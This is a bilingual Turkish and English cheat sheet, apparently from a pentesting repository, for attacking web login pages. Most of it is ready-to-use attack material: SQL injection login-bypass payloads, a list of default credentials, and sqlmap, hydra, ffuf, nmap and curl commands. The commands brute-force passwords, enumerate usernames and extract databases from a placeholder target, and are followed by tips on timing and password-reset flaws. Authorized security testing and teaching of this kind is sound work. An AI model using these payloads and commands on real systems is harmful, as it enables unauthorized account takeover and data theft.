# 🔑 Login Sayfası / Login Page

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | SQL Injection | Giriş bypass | ⬜ |
| 2 | Default Credentials | Varsayılan şifreler | ⬜ |
| 3 | Brute Force | Şifre deneme koruması | ⬜ |
| 4 | Username Enumeration | Kullanıcı adı tespiti | ⬜ |
| 5 | Password Reset | Şifre sıfırlama zafiyeti | ⬜ |
| 6 | Rate Limiting | İstek sınırlaması | ⬜ |
| 7 | Account Lockout | Hesap kilitleme | ⬜ |

### SQL Injection Payloads

```
' OR 1=1--
admin'--
' OR '1'='1
" OR "1"="1
') OR ('1'='1
admin' #
' OR 1=1#
' OR 1=1/*
'-'
' '
'&'
'^'
'*'
' OR ''-'
' OR '' '
' OR ''&'
' OR ''^'
' OR ''*'
```

### Default Credentials

```
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
user:user
administrator:administrator
```

### Komutlar

```bash
# SQL Injection testi (sqlmap)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Brute Force (hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Brute Force (ffuf)
ffuf -w /usr/share/wordlists/rockyou.txt -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"

# Default credential tarama (nmap)
nmap --script http-default-accounts target.com

# Username enumeration (response time)
for user in admin root test guest; do
  time curl -s -X POST http://target.com/login -d "user=$user&pass=test" > /dev/null
done
```

### İpuçları

1. **Hata mesajlarını kontrol et**
   - "Kullanıcı bulunamadı" vs "Şifre yanlış" → Username enumeration
   
2. **Response time farklarını ölç**
   - Geçerli kullanıcı = daha uzun süre (DB sorgusu)
   
3. **Password reset flow'u incele**
   - Token tahmin edilebilir mi?
   - Email header injection var mı?

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | SQL Injection | Login bypass | ⬜ |
| 2 | Default Credentials | Default passwords | ⬜ |
| 3 | Brute Force | Password protection | ⬜ |
| 4 | Username Enumeration | User discovery | ⬜ |
| 5 | Password Reset | Reset flow flaws | ⬜ |
| 6 | Rate Limiting | Request limiting | ⬜ |
| 7 | Account Lockout | Account locking | ⬜ |

### Commands

```bash
# SQL Injection test (sqlmap)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Brute Force (hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Default credential scan (nmap)
nmap --script http-default-accounts target.com
```

### Tips

1. **Check error messages**
   - "User not found" vs "Wrong password" → Username enumeration
   
2. **Measure response time differences**
   - Valid user = longer response (DB query)
   
3. **Examine password reset flow**
   - Is token predictable?
   - Email header injection?

---

[← Back to README](../README.md)
